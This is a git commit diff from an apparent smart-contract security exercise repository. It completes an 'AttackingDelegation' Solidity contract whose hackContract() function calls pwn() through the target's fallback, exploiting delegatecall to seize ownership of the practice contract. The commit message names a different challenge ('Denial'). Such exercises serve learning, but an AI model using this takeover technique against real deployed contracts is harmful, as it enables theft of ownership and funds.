62823cff4aaf688c2d42913bd85aa7f501cd5682
agusbrav <agus.brav@gmail.com>
2022-05-15 16:38:56 -0300

    2: Completed Denial contract attack.

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./Delegation.sol";
+import "hardhat/console.sol";
 
 contract AttackingDelegation {
     address public contractAddress;
@@ -10,6 +11,7 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+        //Calling a function not present in the contract activates fallback function and sends msg.data to delegation.
+        payable(contractAddress).call(abi.encodeWithSignature("pwn()"));
     }
-}
+} 
